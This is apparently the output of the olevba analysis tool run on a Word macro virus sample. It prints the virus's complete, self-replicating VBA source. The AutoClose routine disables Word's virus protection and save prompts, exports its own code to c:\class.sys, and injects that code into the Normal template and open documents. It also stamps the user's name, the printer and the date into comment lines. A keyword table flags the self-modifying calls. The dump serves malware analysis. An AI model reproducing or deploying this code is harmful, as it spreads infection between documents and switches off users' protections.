olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bl-23807312fcf685af2e9aa604b632ec600fcaef46
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bl-23807312fcf685af2e9aa604b632ec600fcaef46 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
On Error GoTo out
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
Options.VirusProtection = False
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
Options.SaveNormalPrompt = False
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
Options.ConfirmConversions = False
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
Ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
If nt > 70 And Ad > 0 Then GoTo out
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
If nt < 70 Then
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End If
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
If Ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
With host.codemodule
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    For x = 1 To 4
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    .deletelines 1
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    Next x
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End With
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
If nt < 70 Then
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    With host.codemodule
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    .replaceline 1, "Sub AutoClose()"
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    .replaceline 71, "Sub ToolsMacro()"
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    End With
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End If
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
With host.codemodule
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    For x = 2 To 72 Step 2
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
    Next x
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End With
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
out:
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
If nt > 70 And Ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End Sub
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
Sub ToolsMacro()
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1
End Sub
'Ditry PC12/23/98 4:34:39 PMHP LaserJet 4 on LPT1:sample1

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

